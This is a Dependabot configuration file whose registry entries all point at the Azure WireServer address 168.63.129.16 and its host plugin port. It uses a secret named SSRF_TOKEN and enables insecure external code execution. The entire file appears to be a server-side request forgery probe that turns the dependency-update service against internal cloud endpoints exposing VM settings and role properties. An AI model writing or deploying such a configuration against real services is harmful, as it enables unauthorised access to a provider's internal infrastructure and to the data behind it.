version: 2
registries:
  hgap-versions:
    type: python-index
    url: http://168.63.129.16:32526/versions#
    token: ${{ secrets.SSRF_TOKEN }}
  hgap-vmsettings:
    type: python-index
    url: http://168.63.129.16:32526/vmSettings#
    token: ${{ secrets.SSRF_TOKEN }}
  hgap-health:
    type: python-index
    url: http://168.63.129.16:32526/health#
    token: ${{ secrets.SSRF_TOKEN }}
  wire-health:
    type: python-index
    url: http://168.63.129.16/machine?comp=health#
    token: ${{ secrets.SSRF_TOKEN }}
  wire-role:
    type: python-index
    url: http://168.63.129.16/machine?comp=roleProperties#
    token: ${{ secrets.SSRF_TOKEN }}
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
    insecure-external-code-execution: allow
    registries:
      - hgap-versions
      - hgap-vmsettings
      - hgap-health
      - wire-health
      - wire-role
